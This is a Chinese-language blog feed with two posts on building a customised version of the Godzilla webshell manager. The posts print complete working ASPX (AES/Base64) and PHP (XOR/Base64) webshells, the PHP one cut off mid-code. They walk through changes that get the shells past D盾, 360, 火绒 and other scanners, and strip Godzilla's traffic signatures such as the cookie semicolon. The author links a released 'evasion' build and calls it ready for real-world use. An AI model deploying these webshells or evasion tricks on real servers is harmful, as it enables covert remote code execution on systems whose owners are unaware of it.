alt="image-20241203171242474"></p><p>如我们所想，阿里云直接检测EXECUTE，存在即被ban，那这样的话，没啥好办法了，和php的eval一样了。先搁着，后面笔者在学习学习。</p><p>微步没问题</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172311267.png" alt="image-20241203172311267"></p><p>河马也没问题</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203172638930.png" alt="image-20241203172638930"></p><p>d盾</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173204184.png" alt="image-20241203173204184"></p><p>360 火绒</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241203173743521.png" alt="image-20241203173743521"></p><p>那么也就是除了aliyun  其他应该都没啥问题</p><p>我们进行简单优化一下，函数和字符串复用一下，尽量少些一点字符。</p><p>然后整到到哥斯拉里。替换一下变量名。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091248725.png" alt="image-20241204091248725"></p><p>模板也修改一下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091323827.png" alt="image-20241204091323827"></p><p>然后打包试一下效果。生成三个免杀🐎，都不一样。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204091723915.png" alt="image-20241204091723915"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092133180.png" alt="image-20241204092133180"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204092220267.png" alt="image-20241204092220267"></p><p>ok，没有任何问题。接下来看aspx。</p><h5 id="aspx-免杀"><a href="#aspx-免杀" class="headerlink" title="aspx 免杀"></a>aspx 免杀</h5><p>我们先来看一下aspx的CSHAP_AES_BASE64的🐎</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ PAge LaNgUagE=&quot;C#&quot;%&gt;</span><br><span class="line">&lt;%try &#123; string key = &quot;3c6e0b8a9c15224a&quot;; string pass = &quot;pass&quot;; string md5 = System.BitConverter.ToString(new System.Security.Cryptography.MD5CryptoServiceProvider().ComputeHash(System.Text.Encoding.Default.GetBytes(pass + key))).Replace(&quot;-&quot;, &quot;&quot;); byte[] data = System.Convert.FromBase64String(Context.Request[pass]); data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(data, 0, data.Length); if (Context.Session[&quot;payload&quot;] == null) &#123; Context.Session[&quot;payload&quot;] = (System.Reflection.Assembly)typeof(System.Reflection.Assembly).GetMethod(&quot;Load&quot;, new System.Type[] &#123; typeof(byte[]) &#125;).Invoke(null, new object[] &#123; data &#125;); ; &#125; else &#123; System.IO.MemoryStream outStream = new System.IO.MemoryStream(); object o = ((System.Reflection.Assembly)Context.Session[&quot;payload&quot;]).CreateInstance(&quot;LY&quot;); o.Equals(Context); o.Equals(outStream); o.Equals(data); o.ToString(); byte[] r = outStream.ToArray(); Context.Response.Write(md5.Substring(0, 16)); Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length))); Context.Response.Write(md5.Substring(16)); &#125; &#125; catch (System.Exception) &#123; &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>代码相对较短。应该调用base64比较简单。asp调用base64代码相对较多，代码一度到了60行。大部分都是在加载base64。主要就是将返回的结果aes后进行base64。</p><p><code>data = new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(System.Text.Encoding.Default.GetBytes(changshangyi), System.Text.Encoding.Default.GetBytes(changshangyi)).TransformFinalBlock(data, 0, data.Length);</code></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101405346.png" alt="image-20241204101405346"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204101424781.png" alt="image-20241204101424781"></p><p>这一句应该是重要，还有</p><p><code>Context.Response.Write(System.Convert.ToBase64String(new System.Security.Cryptography.RijndaelManaged().CreateEncryptor(System.Text.Encoding.Default.GetBytes(key), System.Text.Encoding.Default.GetBytes(key)).TransformFinalBlock(r, 0, r.Length)));</code></p><p>理论上来说关于data处理的都是重要的，d盾都标记了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110311317.png" alt="image-20241204110311317"></p><p>这个地方定义一个变量传参，或者</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204110338085.png" alt="image-20241204110338085"></p><p>直接将aes拆开也行。</p><p>现在报可疑。再fuzz一下，哪里可疑。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204114604778.png" alt="RijndaelManaged"></p><p>RijndaelManaged 换成AesManaged<br>可疑文件出现在下面这一句话上<br>System.Reflection.MethodInfo loadMethod = assemblyType.GetMethod(“Load”, parameterTypes);</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115526559.png" alt="image-20241204115526559"></p><p>这里还是给他拆开写。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204115615828.png" alt="image-20241204115615828"></p><p>这样就可以了。过掉d盾。<br>但是还是有问题，就是显示该文件为单文件aspx，有点丑陋。<br>经过fuzz笔者发现，这个单文件</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134046641.png" alt="image-20241204134046641"></p><p>匹配的就是开头的标识ASPX的一个字段，可以是 c、js、Jscript 、CSHARP等</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134500691.png" alt="image-20241204134500691"></p><p>没有这个就不报了。<br>经过搜索，这个大师傅已经给出了解决方案。</p><p><a href="https://xz.aliyun.com/t/10937">https://xz.aliyun.com/t/10937</a></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134555743.png" alt="image-20241204134555743"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204134705522.png" alt="image-20241204134705522"></p><p>放到最后，并且要&lt;% @language=”c#” %&gt;这么写  就可以绕过了。在优化一下key 和 pass  进行编码一下，隐藏起来。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241204151737129.png" alt="image-20241204151737129"></p><p>来看一下aliyun，还是报恶意，但是这次并没有给出检测的哪里，emmmm，去fuzz的话，相对比较难，就是随便删除代码的话，会报正常，因为阿里云会动态检测，语法不对，就直接报正常了。fuzz的时间相对长一些。先搁置把。<br>微步</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094648151.png" alt="image-20241212094648151"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094657373.png" alt="image-20241212094657373"></p><p>360 火绒</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212094812882.png" alt="image-20241212094812882"></p><p>免杀都没啥问题。<br>这里没有使用其他大师傅那种 unicode编码的免杀，为什么呢，还是在jsp中遇到的，在d盾中，只要有unicode编码，就报可疑，感觉不是很好，所以就没有使用。当然，aspx是可以使用unicode进行免杀的。<br>好开始往里灌，整成动态的。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212163555701.png" alt="image-20241212163555701"></p><p>简单写一下，替换code即可。<br>一如既往生成三个。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164351419.png" alt="image-20241212164351419"></p><p>可以看到，每次都不一定。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164655181.png" alt="image-20241212164655181"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01-2/image-20241212164708818.png" alt="image-20241212164708818"></p><p>ok，使用也没问题。这样的话，aspx的免杀也就完成了。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>这里也算进行了简单的免杀，全部语言除了 aliyun没有过去，其他的平台基本全过。不得不承认，aliyun是强的。php 简单使用了一下类、对关键字进行了chr的替换，jsp重写了base64编码方法，重写了加载aes，使用的反射型方法写的，对关键字进行替换，asp使用了chr进行替换关键字拼接字符串，换了一下函数的写法，aspx对关键函数拆开重写，并且将关键查杀函数重新写了一下，对关键字base64编码。</p><h5 id="下个版本"><a href="#下个版本" class="headerlink" title="下个版本"></a>下个版本</h5><p>1.1版本添加木马的免杀，全语言都做好了，但是并没有改流量以及加密方式，只是做了伪装，<br>后面需要做的：修改一下加密方式，这样的话会更好一点。还有就是message其实是固定的，希望能让他动起来。还有传递的参数 page=1&amp;size=10 是固定的，让他也动起来。其他语言的 比如  jspf的 ，asmx的都没做，后面做。</p><h5 id="下载、使用"><a href="#下载、使用" class="headerlink" title="下载、使用"></a>下载、使用</h5><p>什么，你说看不明白、不想动手、太麻烦，没事，去下载就可以了。<br><a href="https://github.com/Bohemiana/godzilla_erkai">https://github.com/Bohemiana/godzilla_erkai</a><br>release 1.1 免杀版本，src代码也以上传，大家直接下载研究即可。<br>上个版本由于写的比较菜，没好意思跟大家要star，这次自我感觉还行，也算是实战能用了，如果感觉还凑合，大家帮忙点点star</p><h5 id="致谢"><a href="#致谢" class="headerlink" title="致谢"></a>致谢</h5><p>最后感谢您读到现在，这篇文章匆忙构成肯定有不周到或描述不正确的地方，期待业界师傅们用各种方式指正勘误。如果您感觉文章写的不错或者工具用起来还行，帮笔者点点stars、给公众号点点关注，先谢谢大家了。</p><h5 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla            原版哥斯拉</span><br><span class="line">https://github.com/Tas9er/ByPassGodzilla   ByPassGodzilla</span><br><span class="line">https://xz.aliyun.com/t/2758               利用动态二进制加密实现新型一句话木马之.NET篇</span><br><span class="line">https://xz.aliyun.com/t/10937              测试几种实战成功过的webshell的免杀方式</span><br><span class="line">https://xz.aliyun.com/t/11368              实战分析某红队魔改哥斯拉Webshell</span><br><span class="line">https://uuzdaisuki.com/2021/05/12/webshell%E5%85%8D%E6%9D%80%E7%A0%94%E7%A9%B6jsp%E7%AF%87/                   webshell免杀研究jsp篇</span><br><span class="line">https://www.secpulse.com/archives/193780.html        简单操作实现冰蝎jsp webshell 阿里云免杀 </span><br></pre></td></tr></table></figure><blockquote><p>emmm 太菜了<br>一直在路上</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> godzilla </tag>
            
            <tag> 二开 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哥斯拉二开从0到1</title>
      <link href="/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/"/>
      <url>/2024/09/03/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80v1-0/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<p>最近学习了一下冰蝎和哥斯拉的二开，但也只是学习了一丢丢皮毛，这里记录一下。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20241114102655833.png" alt="image-20241114102655833"></p><h5 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h5><p>php5.2  php7.4 java 1.8</p><p>准备工作，这里还是建议使用idea，我用vscode  调，第一步配环境就给我卡死了，调了很久都没有调明白，太菜了。</p><p>首先致敬一下原版哥斯拉，原版地址<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p><p>我们这里使用的最新的<a href="https://github.com/BeichenDream/Godzilla/releases/tag/v4.0.1-godzilla">v4.0.1-godzilla</a>版本，进行逆向及二开。</p><p>反编译网址，<a href="https://www.decompiler.com/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E6%8B%96%E5%85%A5jar%E5%8C%85%E5%8D%B3%E5%8F%AF%EF%BC%8C%E5%BE%88%E6%96%B9%E4%BE%BF%E3%80%82">https://www.decompiler.com/，直接拖入jar包即可，很方便。</a></p><p>当然也可以使用idea的插件进行反编译，都一样。</p><p>ok开始</p><h5 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h5><p>先改个名称试试看</p><p>下载好原版哥斯拉，然后拖到反编译网站，反编译完成后会看到一个压缩包，解压。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145356766.png" alt="image-20240903145356766"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903145521615.png" alt="image-20240903145521615"></p><p>然后新建一个lib目录，将原版的godzilla拖进去，在将刚刚反编译后的目录拖到项目目录下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903150913660.png" alt="image-20240903150913660"></p><p>接着建立依赖关系。</p><p>settings-&gt;Project Structure</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153231158.png" alt="image-20240903153231158"></p><p>然后设置依赖添加我们上面lib里的哪个原版jar包，并且选中，这里笔者建议用jdk1.8，我用java15好像不太行</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153401751.png" alt="image-20240903153401751"></p><p>接着添加主类，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p><p>走到这一步，我们会发现，并没有其他大佬文章中说的有ui里的那个主类，是因为少了一部。</p><p>我们接着要将反编译的src\META-INF/MANIFEST.MF源文件，放到src下面，注意路径。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154657989.png" alt="image-20240903154657989"></p><p>然后同样复制decompiled_src/core/ui/MainActivity.java文件到src目录下</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903154931142.png" alt="image-20240903154931142"></p><p>这样即可</p><p>接着添加主类，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903153706210.png" alt="image-20240903153706210"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903155037743.png" alt="image-20240903155037743"></p><p>即可。</p><h5 id="改标题"><a href="#改标题" class="headerlink" title="改标题"></a>改标题</h5><p>现在就可以编译了，我们先简单的改一下标题。</p><p>复制一份文件，godzilla的标题在core/MainActivity.java复制src/core/MainActivity.java，没有的目录要创建一下。目录一定要对齐。这里一定要清楚，不要在原版的那个和编译的那些文件里改，想改什么，把目录对齐，创建复制文件。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160041594.png" alt="image-20240903160041594"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160220038.png" alt="image-20240903160220038"></p><p>欧克，接下来编译</p><p>先build project</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160353962.png" alt="image-20240903160353962"></p><p>在build artifacts build</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160441514.png" alt="image-20240903160441514"></p><p>编译完成后，在项目目录下面的out/artifacts/下面就会有编译好的godzilla</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160604410.png" alt="image-20240903160604410"></p><p>接着就会发现出现hash错误，接着改，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903160730366.png" alt="image-20240903160730366"></p><p>在core/ApplicationConfig.java<code>复制到</code>src/core/ApplicationConfig.java，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161356407.png" alt="image-20240903161356407"></p><p>将中间的四行对比注释掉即可。</p><p>然后重新build。重新artifacts编译即可。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903161513631.png" alt="image-20240903161513631"></p><p>ok，没有问题。笔者这里并没有经过作者的同意去二开，和验证。奈何我太菜，联系不到大佬，如果有侵权，留个言删除。</p><h5 id="全局改造"><a href="#全局改造" class="headerlink" title="全局改造"></a>全局改造</h5><p>我们知道，godzilla和Behinder都有一些强特征，我们可以加一下混淆或者简单改改。</p><p>在/core/ui/component/frame/ShellSetting.java的文件中，</p><p>大概290行，设置一下ua，<img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903164934529.png" alt="image-20240903164934529"></p><p>直接给他写死，这样的话既可以每次打开不用自己改了。</p><p>还有下面的，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">this.leftTextArea.setText(&quot;page=1&amp;size=10&amp;&quot;);</span><br><span class="line">this.rightTextArea.setText(&quot;&amp;Name=manager&quot;);</span><br></pre></td></tr></table></figure><p>左右追加数据，我们也给他写死，这样，就不用每次写了。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903170904953.png" alt="image-20240903170904953"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240903171100398.png" alt="image-20240903171100398"></p><p>ok，比较方便，当然这里你想加什么都可以，这里只是添加一些参数。</p><p>然后是一个请求体的修改，在其他大师傅的文章中看到，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104429991.png" alt="image-20240918104429991"></p><p>就是这个请求包中cookie中有分号，这是一个强特征，这里咱们没有办法验证，听就行了，给他去掉，</p><p>笔者改的哥斯拉版本在src\util\http\HttpResponse.java下，</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104650774.png" alt="image-20240918104650774"></p><p>默认是``cookies.forEach(cookie -&gt; sb.append(String.format(“ %s=%s;”, cookie.getName(), cookie.getValue())));`</p><p>去掉；即可。打包编译。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918104914935.png" alt="image-20240918104914935"></p><p>ok，没有任何问题。</p><h5 id="godzilla-结构"><a href="#godzilla-结构" class="headerlink" title="godzilla 结构"></a>godzilla 结构</h5><p>没开始之前咱们先看下一Godzilla的shell大概构造</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918105209856.png" alt="image-20240918105209856"></p><p>在shell目录下，有三个目录，一个是加密 解密模块，也就是发送的payload的在本地加密，发送，从客户端解密返回给用户，payload就是各种功能，比如读取，上传，文件、数据库的操作等等，plugins很好理解，就是各种语言的插件，bypassdisable_function，提权，压缩，内存马等等。</p><p>这里说一个shell目录，shell目录下有各种语言的shell，每个语言下有一个Generate.java文件，他是用来生成godzilla木马的框架。然后就是要生成木马。我们点开lib目录下的godzilla.jar，然后是shell  php下面的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112104994.png" alt="image-20240918112104994"></p><p>这些*.bin对应的是这个生成的加密器。也就是xor  base64啥的</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112156254.png" alt="image-20240918112156254"></p><p>相应的下面三个是加密 解密数据包的代码。其他的语言也大差不差。</p><p>这就是godzilla  shell方面大致的理解，目前二开godzilla用到这些就够了。其实是其他的我也不太懂。</p><h5 id="php"><a href="#php" class="headerlink" title="php"></a>php</h5><p>好的，接下来我们开始改流量，先从php开始。</p><p>我们先来看最原版的一句话木马，这里说一下，godzilla是支持一句话木马的。有好多同学面试的时候被问到godzilla支不支持一句话，好多同学不知道。其实他是支持。</p><p>好，先来看一句话的加密器是 PHP_EVAL_XOR_BASE64，他生成的木马就是一句话&lt;?php<br>eval($_POST[“pass”]);</p><p>接着我们看对应的代码，在generate中，判断有没有bin文件，然后替换pass key</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918112958362.png" alt="image-20240918112958362"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113110726-17266302715431.png" alt="image-20240918113110726"></p><p>eval的🐎。如果这个，我们像上面一样，在src目录下新建文件，一样可以替换掉的。</p><p>然后是payload发送，在phpevalxor.java代码中，可以看到具体代码，比如异或，base64，传参等。</p><p>大家可以读读代码。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113403277.png" alt="image-20240918113403277"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918113415634.png" alt="image-20240918113415634"></p><p>好，这里我们不去改变原有的代码，我们新加一个加密器。改的是xor然后base64的加密器。</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918134822003.png" alt="image-20240918134822003"></p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135051300.png" alt="image-20240918135051300"></p><p>好  我们先来打包看看</p><p><img src="/images/%E5%93%A5%E6%96%AF%E6%8B%89%E4%BA%8C%E5%BC%80%E4%BB%8E0%E5%88%B01/image-20240918135414650-17266388554662.png" alt="image-20240918135414650"></p><p>没有问题，godzillaxor base64的木马是这样的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@session_start();</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line">@error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"><span class="variable">$D</span>,<span class="variable">$K</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$D</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="variable">$K</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>];</span><br><span class="line">        <span class="variable">$D</span>[<span class="variable">$i</span>] = <span class="variable">$D</span>[<span class="variable">$i</span>]^<span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$D</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pass</span>=<span class="string">&#x27;pass&#x27;</span>;</span><br><span class="line"><span class="variable">$payloadName</span>=<span class="string">&#x27;payload&#x27;</span>;</span><br><span class="line"><span class="variable">$key</span>=<span class="string">&#x27;3c6e0b8a9c15224a&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]))&#123;</span><br><span class="line">    <span class="variable">$data</span>=encode(base64_decode(<span class="variable">$_POST</span>[<span class="variable">$pass</span>]),<span class="variable">$key</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]))&#123;</span><br><span class="line">        <span class="variable">$payload</span>=encode(<span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>],<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$payload</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)===<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$payload</span>=encode(<span class="variable">$payload</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$payload</span>);</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">0</span>,<span class="number">16</span>);</span><br><span class="line">        <span class="keyword">echo</span> base64_encode(encode(@run(<span class="variable">$data</span>),<span class="variable">$key</span>));</span><br><span class="line">        <span class="keyword">echo</span> substr(md5(<span class="variable">$pass</span>.<span class="variable">$key</span>),<span class="number">16</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos(<span class="variable">$data</span>,<span class="string">&quot;getBasicsInfo&quot;</span>)!==<span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="variable">$payloadName</span>]=encode(<span class="variable">$data</span>,<span class="variable">$key</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span 